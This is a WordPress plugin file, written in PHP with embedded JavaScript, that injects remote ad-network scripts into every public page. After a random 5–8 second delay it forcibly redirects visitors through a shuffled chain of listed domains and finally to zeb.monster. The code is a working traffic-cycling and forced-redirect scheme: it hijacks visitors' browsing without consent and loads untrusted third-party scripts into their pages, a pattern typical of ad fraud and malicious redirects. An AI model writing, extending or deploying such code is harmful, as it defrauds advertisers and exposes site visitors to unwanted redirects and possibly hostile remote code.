<?php
/**
 * Plugin Name: Domain Redirector with Ad Injection (Fixed)
 * Description: Inject ads on current domain, wait 5–8 seconds, then redirect randomly through domains and finally to zeb.monster.
 * Version: 2.0
 * Author: Your Name
 */

if (is_admin()) return;

function stack_domain_redirector_script() {

    $groups = [
        [
            'domains' => ['biharbhumi.info.in','yojana11.com','niveshskill.com','tessofficial.com'],
            'script'  => '<script data-cfasync="false" src="https://scripts.cleverwebserver.com/94fb25de29c41081a956ec738a8faedf.js"></script>'
        ],
        [
            'domains' => ['themovlesflix.info','themovlesflix.online','movlesflix.info','skybap.shop'],
            'script'  => '<script data-cfasync="false" src="https://sads.adsboosters.xyz/ba8d9dd35268014c09031a8c587cf84e.js"></script>'
        ],
        [
            'domains' => ['evcarjankari.com'],
            'script'  => '<script data-cfasync="false" src="https://sads.adsboosters.xyz/ffc8b614d688665892a7071a2a3dc5f2.js"></script>'
        ]
    ];

    $json = json_encode($groups);
    ?>

<script>
(function(){
    const groups = <?php echo $json; ?>;
    const current = location.hostname;
    let domainList = [];
    let adScript = '';

    groups.forEach(g => {
        if (g.domains.includes(current)) {
            adScript = g.script;
        }
        g.domains.forEach(d => {
            if (d !== current) domainList.push(d);
        });
    });

    domainList = [...new Set(domainList)].sort(() => Math.random() - 0.5);

    function injectAd() {
        if (!adScript) return;
        const div = document.createElement('div');
        div.className = 'stack-ads';
        div.innerHTML = adScript;
        document.body.appendChild(div);
    }

    function redirectFlow() {
        if (domainList.length > 0) {
            location.href = 'https://' + domainList.shift();
        } else {
            location.href = 'https://zeb.monster';
        }
    }

    window.addEventListener('load', () => {
        injectAd();
        const delay = Math.floor(Math.random() * 3000) + 5000;
        setTimeout(redirectFlow, delay);
    });
})();
</script>

<?php
}

add_action('wp_footer', 'stack_domain_redirector_script');
